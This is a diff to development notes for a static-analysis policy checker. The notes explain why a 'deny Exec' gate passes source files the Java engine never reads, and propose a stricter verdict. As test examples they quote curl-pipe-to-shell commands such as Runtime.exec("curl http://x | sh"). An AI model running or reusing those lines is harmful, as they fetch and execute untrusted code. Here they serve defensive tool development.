@@ -1241,7 +1241,35 @@ finding, and this is the shape (`only`'s prefix matcher, ⟨0.29⟩) that has al
     · **REMAINING FOR B1: nothing but the RELEASE.** The floor moves at release, not here — every engine
       declaring 0.29, `bin/release.sh`, then `release-verify`. Ship it with whatever else rides 0.29.
     Original statement of the defect:
-  · B1 the FILE-SET CARDINAL SIN — `unanalyzed` covers files that FAILED to parse, not files never
+  · **B1 RE-MEASURED 2026-08-21 AFTER ⟨0.29⟩+⟨0.30⟩ — STILL EXIT 0, AND THE REASON IS NOW EXACT.**
+    ⟨0.29⟩ made it DISCLOSED (a stderr line naming the ratio, and an `excluded` entry); ⟨0.30⟩ made a
+    non-empty `outOfScope` INCOMPLETE at exit 2. Neither closes it, and the measurement says why:
+
+        excluded:   [{class: "source-without-class", count: 1, peeked: false}]
+        outOfScope: []            <- EMPTY, so the ⟨0.30⟩ rule cannot fire
+        verdict:    exit 0        <- green, over Runtime.exec("curl http://x | sh")
+
+    **The fail-closed rule is keyed on what the peek FOUND, never on what it admits it COULD NOT READ.**
+    candor-java reads bytecode, so the peek is structurally incapable of opening a `.java` source; it
+    therefore finds nothing, and nothing-found is byte-identical to clean. The exclusion class says
+    `peeked: false` — the engine stating plainly that it did not read these files — and that flag
+    carries NO verdict consequence anywhere.
+
+    This is [[candor-unanswerable-key]]'s THREE-ROW RULE applied to the file set: absence under a key
+    licenses a claim only if the key COULD have had a body. `peeked: false` is exactly the case where it
+    could not.
+
+    **THE SHAPE OF THE FIX, and it is a RUNG not a patch:** an exclusion class with `peeked: false`
+    should make the verdict INCOMPLETE (exit 2), for the same reason ⟨0.30⟩ ruled a non-empty
+    `outOfScope` does. That turns GREEN GATES RED, which is Tom's ruling to make — ⟨0.30⟩'s equivalent
+    was. Constraint from the `net-partner` attempt: whatever this becomes must be reachable identically
+    on `scan --policy` and `gate --report`, or §3.1 route equality breaks. `excluded` IS carried in the
+    report, so unlike `net-partner` both routes can see it — that is what makes this one tractable.
+
+    **The same question in a second costume** is the execa/axios item below (`deny Exec` green over 16
+    unjudged library functions, `outside-the-tsconfig-program`). One ruling should settle both.
+
+    (original filing) `unanalyzed` covers files that FAILED to parse, not files never
     CONSIDERED. `deny Exec` → `policy ✓` over a repo containing `execSync("curl | sh")`; `build.rs`
     running `Command::new("curl")` invisible. **NOW MEASURED IN ALL FOUR (java arm done 2026-08-15).**
     java, pointed at a REPO ROOT (not a classes dir) under `deny Exec`: exit 0, `candor-java: no
